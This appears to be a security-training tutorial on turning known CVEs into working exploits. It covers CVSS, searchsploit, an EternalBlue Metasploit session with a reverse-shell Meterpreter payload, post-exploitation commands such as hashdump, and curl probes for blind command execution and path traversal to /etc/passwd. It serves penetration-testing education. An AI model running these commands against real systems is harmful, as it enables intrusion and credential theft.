# Weaponizing Vulnerabilities

## Overview

Identifying a vulnerability is only the first step — understanding how an attacker would weaponize it is what gives a security assessment its real value. This room covers the attacker perspective on moving from a discovered vulnerability to a working exploit: CVE research, exploit databases, proof-of-concept development, exploitation frameworks, and responsible disclosure. The goal is to understand the full attack chain so that defenders and developers can reason about the actual risk a vulnerability represents.

This knowledge is essential for penetration testers who need to demonstrate impact, for security engineers who need to prioritise remediation, and for developers who need to understand why a finding matters beyond its CVSS score.

---

## Topics Covered

- CVEs and the vulnerability lifecycle
- Exploit databases (Exploit-DB, NVD, Metasploit)
- Proof-of-concept (PoC) research and weaponization
- Metasploit Framework for structured exploitation
- Manual exploitation approach
- Responsible disclosure and CVE assignment process

---

## Key Concepts

### CVE — Common Vulnerabilities and Exposures

**Definition:** The CVE system is a publicly maintained catalogue of known security vulnerabilities. Each entry has a unique identifier (`CVE-YYYY-NNNN`), a description of the vulnerability, the affected software and versions, and references to patches and advisories.

**Structure of a CVE:**
- **CVE ID:** Unique identifier — e.g., `CVE-2021-44228` (Log4Shell)
- **Description:** What the vulnerability is and how it works
- **Affected Versions:** The specific software versions that contain the vulnerability
- **CVSS Score:** A numerical score (0–10) representing severity
- **References:** Vendor advisories, patches, PoC links, researcher writeups

**CVSS (Common Vulnerability Scoring System):**
CVSS v3.1 rates vulnerabilities on a 0–10 scale across several dimensions:

| Score Range | Severity |
|------------|---------|
| 0.0 | None |
| 0.1–3.9 | Low |
| 4.0–6.9 | Medium |
| 7.0–8.9 | High |
| 9.0–10.0 | Critical |

**CVSS Base Metrics include:**
- Attack Vector (Network, Adjacent, Local, Physical)
- Attack Complexity (Low, High)
- Privileges Required (None, Low, High)
- User Interaction (None, Required)
- Confidentiality / Integrity / Availability Impact

**Important Limitation:** CVSS measures theoretical severity based on the vulnerability's properties — not real-world exploitability in a specific environment. A CVSS 9.8 vulnerability may be unexploitable in a hardened deployment; a CVSS 5.0 vulnerability may be highly exploitable in a particular context.

---

### Vulnerability Research Phase

Before developing or using an exploit, the attacker (or penetration tester) researches the vulnerability thoroughly:

**Steps:**
1. Identify the target software and version (from banner grabbing, headers, source comments)
2. Search the CVE database (NVD: nvd.nist.gov) for known CVEs affecting that version
3. Read the CVE description and any linked advisories to understand the vulnerability class
4. Search Exploit-DB, GitHub, or PacketStorm for public exploits or PoC code
5. Read the original researcher's writeup or advisory for technical depth
6. Understand the conditions required to exploit: network access, authentication, specific configuration

---

### Exploit Databases

**Exploit-DB (exploit-db.com):**
- Maintained by Offensive Security (creators of Kali Linux)
- Contains thousands of public exploits and PoC code
- Integrated with the `searchsploit` command-line tool in Kali/Parrot
- Exploits are categorised by platform, type, and CVE reference

**searchsploit Usage:**
```bash
# Search for exploits related to a specific product
searchsploit apache 2.4.49

# Search for a specific CVE
searchsploit CVE-2021-41773

# Copy an exploit to current directory
searchsploit -m 50383

# Show the exploit's path and open it
searchsploit -p 50383
```

**NVD (National Vulnerability Database — nvd.nist.gov):**
- Maintained by NIST (National Institute of Standards and Technology)
- Authoritative source for CVE details, CVSS scores, and CPE (affected product) data
- Best source for understanding the technical specifics of a vulnerability

**GitHub:**
- Many security researchers publish PoC code on GitHub shortly after a CVE is made public
- Search by `CVE-YYYY-NNNN` — often more detailed and up-to-date than Exploit-DB entries

---

### Proof-of-Concept (PoC) Code

**Definition:** A PoC is the minimal code or sequence of steps required to demonstrate that a vulnerability is exploitable. A PoC proves impact — it confirms that the vulnerability is real and demonstrates what an attacker could do.

**PoC vs Weaponized Exploit:**
- A PoC demonstrates the vulnerability exists — it may require manual setup, specific conditions, or produce limited output (e.g., a 5-second sleep confirming blind injection)
- A weaponized exploit is reliable, operational, and extended to achieve a specific goal (RCE, credential dump, full takeover)
- Most public PoC code requires adaptation to work reliably against a real target

**Adapting a PoC:**
- Modify hardcoded IP addresses, ports, paths, and payload targets
- Handle edge cases the original author didn't account for
- Test against an identical version in a controlled lab before using
- Understand what the exploit does at each step before running it

---

### Metasploit Framework

**Definition:** Metasploit is an open-source exploitation framework that provides a structured environment for developing and executing exploits, managing payloads, and maintaining access.

**Core Components:**

| Component | Description |
|-----------|------------|
| Modules | Exploits, auxiliary tools, post-exploitation, payloads — all modular |
| msfconsole | Primary command-line interface |
| msfvenom | Standalone payload generator |
| Payloads | Code to execute on the target after exploitation (reverse shell, bind shell, Meterpreter) |
| Meterpreter | Advanced in-memory payload with rich post-exploitation capabilities |

**Basic Metasploit Workflow:**
```bash
# Start msfconsole
msfconsole

# Search for a module
search type:exploit name:eternalblue

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# View required options
show options

# Set target and payload
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Check if target appears vulnerable
check

# Run the exploit
run
```

**Meterpreter Commands (post-exploitation):**
```bash
getuid              # Current user
sysinfo             # System information
hashdump            # Dump password hashes
getsystem           # Attempt privilege escalation
upload /path/file   # Upload a file to the target
download /path/file # Download a file from the target
shell               # Drop into system shell
migrate <PID>       # Migrate to another process
```

---

### Manual Exploitation

Not all vulnerabilities have Metasploit modules. Manual exploitation requires understanding the vulnerability at a deeper level:

**Process:**
1. Understand the vulnerability — what input is mishandled, what is the attacker-controlled variable?
2. Craft the initial test payload — a simple probe that confirms exploitability (e.g., sleep command for blind SQLi)
3. Iteratively refine the payload to achieve the desired outcome
4. Handle encoding, escaping, and format requirements for the specific target
5. Develop a reliable, repeatable exploit sequence

**Common manual exploitation patterns:**
```bash
# Confirming remote code execution via time delay (blind test)
curl "http://target/vulnerable-param?cmd=sleep+5"

# Exfiltrating output via OOB channel (DNS or HTTP)
# (conceptual — specific payload depends on vulnerability class)

# File read via path traversal
curl "http://target/download?file=../../../../etc/passwd"
```

---

### Responsible Disclosure

**Definition:** Responsible disclosure (also called coordinated disclosure) is the process of reporting a vulnerability to the affected vendor before making it public, giving them time to develop and release a patch.

**Standard Process:**
1. Researcher discovers a vulnerability
2. Researcher notifies the vendor privately (usually via a security contact or bug bounty programme)
3. Vendor acknowledges the report and develops a patch
4. A disclosure deadline is agreed (typically 90 days — Google Project Zero standard)
5. Vendor releases the patch and CVE is published simultaneously
6. Researcher publishes technical writeup after the patch is available

**CVE Assignment:**
- CVEs are assigned by CVE Numbering Authorities (CNAs) — vendors, research organisations, MITRE
- A researcher can request a CVE from MITRE at cve.mitre.org if the affected vendor is not a CNA

**Bug Bounty Programmes:**
- Many organisations operate formal bug bounty programmes (via HackerOne, Bugcrowd, Intigriti)
- Researchers report vulnerabilities in exchange for monetary rewards
- Programmes define scope (what can be tested) and out-of-scope items
- Responsible disclosure timelines and processes are defined by the programme policy

---

## Important Terminology

| Term | Meaning |
|------|---------|
| CVE | Common Vulnerabilities and Exposures — unique identifier for a known vulnerability |
| CVSS | Common Vulnerability Scoring System — numerical severity rating (0–10) |
| NVD | National Vulnerability Database — authoritative CVE detail source |
| Exploit-DB | Public exploit and PoC database maintained by Offensive Security |
| PoC | Proof of Concept — minimal code demonstrating a vulnerability is real and exploitable |
| Metasploit | Open-source exploitation framework with modular exploit and payload architecture |
| Meterpreter | Metasploit's advanced in-memory post-exploitation payload |
| RCE | Remote Code Execution — the ability to execute arbitrary commands on a remote system |
| Responsible Disclosure | Process of privately reporting a vulnerability to the vendor before public release |
| Bug Bounty | Programme where organisations reward researchers for responsibly disclosing vulnerabilities |

---

## Real-World Relevance

- CVE research is the starting point of every real-world exploitation attempt — identifying the software version leads directly to known CVE lookups
- The time between a CVE being published and mass exploitation in the wild is shrinking — "patch lag" is a major enterprise risk
- Metasploit is used by both offensive (penetration testers) and defensive (threat simulation teams, purple teams) security practitioners
- Responsible disclosure has created a healthier security ecosystem — most major software vendors now have formal bug bounty programmes
- The 2021 Log4Shell vulnerability (CVE-2021-44228, CVSS 10.0) demonstrated how quickly PoC weaponization happens — functional exploits appeared within hours of public disclosure

---

## Key Learnings

- A CVE ID, CVSS score, and affected version list are the starting point for vulnerability research
- CVSS is a severity indicator, not a prioritisation tool — context determines actual risk
- Exploit-DB and `searchsploit` are the fastest paths to finding public exploits for a known CVE
- PoC code requires adaptation — always understand what it does before running it
- Metasploit provides a structured framework for both exploitation and post-exploitation phases
- Responsible disclosure is the ethical standard for vulnerability reporting — 90-day timelines are now the norm

---

## Conclusion

Weaponizing a vulnerability is the process of moving from a theoretical finding to a demonstrated impact — and understanding this process is what separates a meaningful security assessment from a checklist exercise. CVE research, exploit databases, PoC adaptation, and frameworks like Metasploit are the toolchain that takes a version number to a working exploit. Equally important is the responsible disclosure process — ensuring that vulnerability knowledge is handled ethically and that fixes reach users before attackers can weaponize findings at scale.
